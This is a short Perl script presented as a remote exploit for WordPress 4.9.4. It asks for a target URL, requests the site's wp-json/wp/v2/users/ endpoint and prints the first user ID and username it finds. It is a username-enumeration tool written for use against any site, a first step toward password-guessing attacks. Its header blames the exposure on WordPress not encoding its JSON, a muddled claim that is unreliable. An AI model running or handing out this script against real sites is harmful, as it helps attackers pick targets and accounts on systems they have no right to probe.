#!/usr/bin/perl
#####################################################
# Title : HACKER EXPLOÝT
# Author : dr-iman
# Vendor : https://wordpress.org/
# Software Link: https://wordpress.org/download/
# Version : 4.9.4
# Date : 17 Feb 2018
# Tested On : Ubuntu / Windows 10
# Type : Remote
#####################################################
# Descryption :
# In Wordpress 4.9.4 We Can Find All Users Website
# Directory wp-json/wp/v2/users/
# The Reason Of This Vuln ins wordpress don't encoded the json sources
# usage : perl username.pl

use LWP::UserAgent;


my $ua = LWP::UserAgent->new;

system(($^O eq 'MSWin32') ? 'cls' : 'clear');

print <<logo;
 _ _ _           _                     
| | | |___ ___ _| |___ ___ ___ ___ ___ 
| | | | . |  _| . | . |  _| -_|_ -|_ -|
|_____|___|_| |___|  _|_| |___|___|___|
                  |_|                  
logo

print "\n[-] Wordpress 4.9.4 Username Enumeration";

print "\nEnter Target URL : ";
my $url=<>;
chomp($url);

my $target = "$url/wp-json/wp/v2/users/";
my $content = $ua->get("$target")->content;
if ($content =~ /"id":(.*?),/)
{
print "\nID : $1\n";
}


if ($content =~ /"name":"(.*?)",/)
{
print "\nUsername : $1\n";
}